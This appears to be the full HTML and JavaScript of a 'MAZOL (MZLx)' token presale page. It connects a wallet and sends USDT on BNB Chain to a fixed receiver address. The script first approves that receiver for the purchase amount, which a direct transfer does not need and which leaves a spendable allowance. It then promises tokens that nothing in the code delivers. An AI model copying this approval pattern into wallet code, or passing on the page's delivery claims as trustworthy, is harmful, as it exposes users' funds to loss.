<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MAZOL (MZLx) Token Sale</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #006666, #008080);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 450px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
      padding: 30px;
      text-align: center;
    }
    
    .logo {
      width: 110px;
      height: 110px;
      margin: 0 auto 20px auto;
      display: block;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid #1a73e8;
    }
    
    h1 {
      font-size: 1.4rem;
      margin-bottom: 10px;
      color: #222;
    }
    
    .subtitle {
      color: #1a73e8;
      font-size: 1rem;
      margin-bottom: 25px;
    }
    
    .desc {
      color: #555;
      margin-bottom: 25px;
      font-size: 0.95rem;
    }
    
    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      color: #333;
      font-weight: 600;
    }
    
    input[type="number"] {
      width: 100%;
      padding: 16px;
      font-size: 1.05rem;
      border-radius: 10px;
      border: 1px solid #ddd;
      background: #f9f9f9;
    }
    
    .output {
      margin-bottom: 20px;
      padding: 15px;
      background: #f0f9ff;
      border-radius: 10px;
      font-weight: bold;
      font-size: 1.1rem;
      color: #1a73e8;
      border: 1px solid #cce5ff;
    }
    
    button {
      width: 100%;
      padding: 17px;
      background: linear-gradient(to right, #1a73e8, #0d5abf);
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 15px;
    }
    
    button:disabled {
      background: #aaa;
      cursor: not-allowed;
    }
    
    .footer {
      text-align: center;
      color: #999;
      font-size: 0.85rem;
      margin-top: 25px;
      padding-top: 15px;
      border-top: 1px solid #eee;
    }
    
    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 10px;
      display: none;
      font-size: 0.95rem;
    }
    
    .status.processing {
      background: #cce5ff;
      color: #004085;
      border: 1px solid #b8daff;
    }
    
    .status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    
    .status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(26, 115, 232, 0.3);
      border-radius: 50%;
      border-top-color: #1a73e8;
      animation: spin 1s linear infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://i.imgur.com/gaCl9Zz.jpeg" alt="MAZOL Logo" />
    <h1>Private Sale: MAZOL (MZLx) Tokens</h1>
    <div class="subtitle">Blockchain Powered Trust-Grade Training and Marketplace Solutions</div>
    <div class="desc">Buy MZLx tokens with USDT (BEP-20, BNB Chain)<br>1 MZLx = 0.15 USDT</div>
    
    <div class="input-group">
      <label for="usdtAmount">Enter USDT Amount</label>
      <input type="number" id="usdtAmount" min="0.15" step="0.01" placeholder="e.g. 15" />
    </div>
    
    <div class="output" id="mzlxOutput">You will receive: 0 MZLx</div>
    
    <button id="connectAndBuyBtn">Connect Wallet & Buy</button>
    
    <div class="status" id="statusMessage"></div>
    <div class="footer">Powered by MAZOLX</div>
  </div>

  <script>
    // ===== CONFIGURATION ===== //
    const TOKEN_PRICE = 0.15;
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const RECEIVER_ADDRESS = "0x4bd6033bCe207fa4F5a2Bd4d003a690ed4c3D859";

    // ===== UI ELEMENTS ===== //
    const usdtInput = document.getElementById("usdtAmount");
    const mzlxOutput = document.getElementById("mzlxOutput");
    const connectAndBuyBtn = document.getElementById("connectAndBuyBtn");
    const statusMessage = document.getElementById("statusMessage");

    // ===== STATE VARIABLES ===== //
    let currentUSDTAmount = 0;
    let currentMZLxAmount = 0;

    // ===== INITIAL SETUP ===== //
    document.addEventListener('DOMContentLoaded', initApp);
    
    function initApp() {
      usdtInput.addEventListener('input', handleUSDTInput);
      connectAndBuyBtn.addEventListener('click', startPurchaseProcess);
      updateMZLxOutput();
    }

    // ===== REAL-TIME CALCULATION ===== //
    function handleUSDTInput() {
      currentUSDTAmount = parseFloat(usdtInput.value) || 0;
      currentMZLxAmount = currentUSDTAmount / TOKEN_PRICE;
      updateMZLxOutput();
    }

    function updateMZLxOutput() {
      mzlxOutput.textContent = `You will receive: ${currentMZLxAmount.toFixed(2)} MZLx`;
    }

    // ===== PURCHASE WORKFLOW ===== //
    async function startPurchaseProcess() {
      if (currentUSDTAmount < TOKEN_PRICE) {
        showStatus(`Minimum purchase is ${TOKEN_PRICE} USDT`, "error");
        return;
      }
      
      if (!window.ethereum) {
        showStatus("Please install a Web3 wallet like MetaMask", "error");
        return;
      }
      
      try {
        showStatus("Initializing wallet connection...", "processing");
        
        // Connect to wallet
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]); // BSC
        
        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();
        
        showStatus("Wallet connected. Preparing transaction...", "processing");
        
        // Get USDT contract
        const usdtContract = new ethers.Contract(
          USDT_ADDRESS,
          [
            "function decimals() view returns (uint8)",
            "function balanceOf(address owner) view returns (uint256)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transfer(address to, uint256 amount) public returns (bool)"
          ],
          signer
        );
        
        // Get decimals
        const decimals = await usdtContract.decimals();
        const usdtValue = ethers.parseUnits(currentUSDTAmount.toString(), decimals);
        
        // Check balance
        const balance = await usdtContract.balanceOf(userAddress);
        if (balance < usdtValue) {
          showStatus(`Insufficient USDT balance. You need ${currentUSDTAmount} USDT`, "error");
          return;
        }
        
        // Check allowance
        const allowance = await usdtContract.allowance(userAddress, RECEIVER_ADDRESS);
        if (allowance < usdtValue) {
          showStatus("Approval needed. Please confirm in your wallet...", "processing");
          
          // Initiate approval transaction
          const approveTx = await usdtContract.approve(RECEIVER_ADDRESS, usdtValue);
          await approveTx.wait();
        }
        
        showStatus("Sending USDT. Please confirm in your wallet...", "processing");
        
        // Initiate transfer transaction
        const transferTx = await usdtContract.transfer(RECEIVER_ADDRESS, usdtValue);
        const receipt = await transferTx.wait();
        
        if (receipt.status === 1) {
          showStatus(`Success! ${currentMZLxAmount.toFixed(2)} MZLx will be sent to your wallet`, "success");
          usdtInput.value = "";
          currentUSDTAmount = 0;
          currentMZLxAmount = 0;
          updateMZLxOutput();
        } else {
          showStatus("Transaction failed. Please try again.", "error");
        }
        
      } catch (err) {
        showStatus("Transaction failed: " + (err.message || err), "error");
      }
    }

    // ===== HELPER FUNCTIONS ===== //
    function showStatus(message, type) {
      statusMessage.textContent = message;
      statusMessage.className = 'status ' + type;
      statusMessage.style.display = 'block';
      
      if (type === 'processing') {
        statusMessage.innerHTML = `<span class="spinner"></span> ${message}`;
      }
      
      if (type === 'success') {
        setTimeout(() => {
          statusMessage.style.display = 'none';
        }, 10000);
      }
    }
  </script>
</body>
</html>
